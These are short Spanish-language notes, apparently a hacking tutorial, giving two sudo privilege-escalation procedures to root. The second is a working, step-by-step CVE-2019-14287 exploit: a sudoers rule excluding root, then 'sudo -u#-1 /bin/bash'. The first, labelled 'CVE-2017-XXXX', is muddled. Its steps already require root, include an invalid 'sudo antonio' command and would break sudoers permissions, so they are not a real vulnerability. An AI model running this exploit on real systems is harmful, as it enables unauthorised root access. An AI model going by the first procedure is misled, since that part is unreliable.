# sudo

# CVE-2017-XXXX hackingyseguridad

#1.- Para editar el fichero sudiers sin problemas 

$chmod 777 /etc/sudoers    

#2.- Añadidmos en la linea sudo de /etc/group a antonio

sudo vim /etc/group

sudo:x : 27:antonio

forzamos la escritura en group al salir con :wq!

#3.- Restablecemos los privilegios del fichero sudoers con 

$chmod 755 /etc/sudoers

#4.- Explotamos 

$sudo antonio

$sudo su

#whoami

#5.- ya somos root!


# CVE-2019-14287 VULNERABILIDAD SUDO VERSIONES < 1.8.28 

#0.- Comprovamos la version de sudo instalada con: 

$sudo -V

#1.- Editamos el fichero /etc/sudoers con $sudo visudo 

#2.- Añadimos la linea con el usuario antonio 

#User privilege specification

root ALL=(ALL:ALL) ALL

%admin ALL=(ALL) ALL

antonio ALL=(ALL) /usr/bin/id

#3.- Ejecutamos: 

$su antonio

$sudo id

$sudo whoani

$sudo -u antonio id

#4.- Volvemos a editar el fichero /etc/sudoers con $sudo visudo

#5.- Modificamos la linea

antonio ALL=(ALL, !root) ALL

#6.- Explotamos la vulnerabilidad con sudo -u#-1

$sudo -u#-1 /bin/bash

#whoami

#7.- ya somos root!
